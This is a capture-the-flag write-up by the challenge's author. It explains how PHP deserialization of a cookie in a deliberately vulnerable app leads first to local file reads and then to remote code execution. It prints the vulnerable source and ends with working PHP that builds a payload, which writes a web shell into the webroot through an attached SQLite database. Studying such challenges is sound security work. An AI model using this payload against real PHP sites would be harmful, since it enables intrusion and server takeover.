---
title: Cyberleague Quarterfinals 2022 - Pretty Hyper Phrog
date: 2022-12-23
excerpt: Pretty Hyper Phrog writeup - PHP deserialization to LFI + RCE
category: writeups
tags:
    - web
---

Writeup for one of the web challenges I set for [Cyberleague
2022](https://cyberleague.co/).

Here is the [source](/files/clqf-2022/php.zip)

The main vuln is PHP deserialization. In PHP, this allows
for arbitrary properties to be assigned to objects. In addition, the class of
the object can also be controlled. With these interesting capabilities of unsafe
deserialization, I made a 2-phase challenge that will require one to leverage
both concepts + some other exotic concepts to ultimately get RCE.

# Phase 1: LFI

Since the source wasn't provided in the CTF, our first goal is to get some sort
of LFI to get the complete source. 


Here's a sample "password", our attack vector:

```
Tzo0OiJVc2VyIjozOntzOjc6InBpY3R1cmUiO3M6MTY6InN0YXRpYy9waHJvZy5naWYiO3M6ODoidXN lcm5hbWUiO3M6ODoic2FtdXpvcmEiO3M6NDoidXVpZCI7czoxMzoiNjNhNDYyNTViNGM5YiI7fQ==
```

We know that each user's password is a PHP serialized object, and there is a
property `picture` that is pointing to `static/phrog.gif`. After some
experimenting we see that this is passed to `file_get_contents`, which we can
use to enumerate the source.

---

# Phase 2: RCE

We not only want LFI, we want RCE too! With big and well-known frameworks, PHP
deserialization is a piece of cake, as there are ready-made RCE gadget chains
online. However, this is a custom implementation so it doesn't exist. We need to
make it ourselves :(

Some of the leaked files:

index.php
```php
<?php
require("user.php");
require("util.php");

$conn = new Conn;

if (array_key_exists("password", $_COOKIE) === false) {
    echo file_get_contents("static/index.html");
    die();
}
$temp = unserialize(base64_decode($_COOKIE["password"]));
$conn->query = "select username, uuid from users where uuid = :uuid";
$conn->params = array(":uuid" => $temp->uuid);
$result = $conn->query();
if ($result) {
    $user = $temp;
} else {
    header("Location: /login.php");
}
?>

<!DOCTYPE html>
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
</head>
<body>
    <div class="container mt-5 px-auto">
        <div class="row">
            <div class="col">
                 <?php echo $user->whoami(); ?>
            </div>
            <div class="col">
                <p>I hope u like phrogs</p>
            </div>
        </div>
    </div>
</body>
```

user.php
```php
<?php
class User {
    public $picture;
    public $username;
    public $uuid;

    public function __construct(string $username, string $uuid) {
        $this->username = $username;
        $this->picture = "static/phrog.gif";
        $this->uuid = $uuid;
    }
    
    public function whoami() {
        $picture = base64_encode(file_get_contents($this->picture));
        return "
            <div class='card' style='width: 50%'>
                <img class='card-img-top' src='data:image/gif;base64,{$picture}' class='rounded' alt='phrog'>
                <div class='card-body'>
                    <h5 class='card-title'>User: {$this->username}</h5>
                    <p>uuid: {$this->uuid}</p>
                </div>
            </div>
        ";
    }
}
?>
```

util.php
```php
<?php
class Conn {
    public $query;
    public $params;

    public function __call(string $name, array $arguments) {
        $conn = new SQLite3("/sqlite3/db");
        $query = $this->query;
        foreach ($this->params as $key=>$value) {
            $value = $conn->escapeString($value);
            $query = str_replace($key, "'$value'", $query);
        }

        // in case we ever need to execute multiple queries
        $queries = explode("; ", $query);
        foreach ($queries as $temp) {
            $result = $conn->query($temp);
        }
        if ($result !== false) {
            if ($result->numColumns()) {
                return $result->fetchArray();
            } else {
                return true;
            }
        } else {
            return $result;
        }
    }
}
?>
```

Some things to note:

1. In `Conn`, the query is being prepared manually. This could maybe give us
   SQLi, if we manage to bypass the (not so stringent) checks. Props to RVCTF
   who found an unintended solution via the weak escaping. (The reason why I had
   to implement my own query, is because we need multiple queries for the
   exploit - and I couldn't find a driver that could allow me to do that. So I
   exploded based on `; ` and ran each query manually.)
2. In `Conn`, `__call` is being used to invoke the query function. [This magic
   method](https://www.phptutorial.net/php-oop/php-__call/) defines a fallback
   for undefined properties that are invoked.

As you might guess based on the context of the challenge, we can change `$temp`
(and hence `$user`) into a `$Conn` object. This would allow us to control the
`$query` array in our poisoned object and execute our own queries via the
`->whoami()` call (since it doesn't exist on a `$Conn`, it will fallback to
`__call()`). While we do this, we also need to ensure that `->username` and
`->uuid` remains constant so we pass the check.

With this we can execute arbitrary SQL (should I call this SQLi?). But how to
get RCE?

SQLite uses a single-file database locally, instead of connecting to a remote
service. And we can attach new databases to arbitrary locations, which creates a
file with some binary content, as well as whatever we insert into the new
database. 

So in a fashion similar to PHP web shells, we can create a malicious SQLite
database in `/var/www/html`, create a table and insert a row with our web
shell, thus gaining RCE!

Below is the code to generate the payload:

```php
<?php
class Conn {
    public $username = 'samuzora';
    public $uuid = '63a46255b4c9b';
    public $query = "attach database './63a46255b4c9b.php' as test; create table test.a (payload text); insert into test.a values ('<?php system(\$_GET[\"cmd\"]) ?>')";
    public $params = array();
}
echo base64_encode(serialize(new Conn));
?>
```
